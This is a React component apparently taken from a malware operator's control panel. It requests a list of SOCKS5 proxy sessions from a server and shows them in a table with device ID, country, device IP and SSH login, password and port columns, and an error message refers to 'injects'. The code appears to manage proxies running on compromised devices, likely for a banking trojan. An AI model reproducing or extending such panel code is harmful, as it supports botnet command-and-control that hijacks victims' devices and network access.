import React from 'react';
import Socks5Row from './Socks5Row';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';


class Socks5Table extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
          error: null,
          isLoaded: false,
          arrayData: []
        };
    }
    
    componentDidMount() {
        this.onLoadJson();
    }

    componentWillReceiveProps() {
        this.onLoadJson();
    }

    onLoadJson () {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"get_list_socks5"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                }
                else {
                    this.setState({
                        isLoaded: true,
                        arrayData: result.socks5
                    });
                }
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading injects. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render () { 
        const Px70Width = {
            marginLeft: '5px',
            width: '1px',
            textAlign: 'center',
            fontSize: '20px'
        }

        const id_device = {
            marginLeft: '5px',
            width: '160px',
            textAlign: 'center',
            fontSize: '20px'
        }


        if (!this.state.isLoaded) {
            return <div class="load-4"><div class="ring-1"></div></div>
        }
        return (
            <React.Fragment>
                <table class="table table-striped table-hover">
                    <thead class="thead-light">
                        <tr>
                        <th scope="col" style={Px70Width}></th>
                        <th scope="col" style={Px70Width}>ID Session</th>
                        <th scope="col" style={id_device}>ID Device</th>
                        <th scope="col" style={Px70Width}>Country </th>
                        <th scope="col" style={Px70Width}>SSH Login/Password</th>
                        <th scope="col" style={Px70Width}>IP/Port</th>
                        <th scope="col" style={Px70Width}>SSH Connect</th>
                   
                       
                        </tr>
                    </thead>
                    <tbody>
                        {this.state.arrayData.map(item => (
                        <Socks5Row InjListForceUpdate={this.props.InjListForceUpdate} id={item.id} id_device={item.id_device} ip_serv={item.ip_serv} port={item.port}  online={item.online}  user={item.user}  password={item.password}  ip_device={item.ip_device} country={item.country} />
                        ))}
                    </tbody>
                </table>
            </React.Fragment>
        );
    }

}

export default Socks5Table;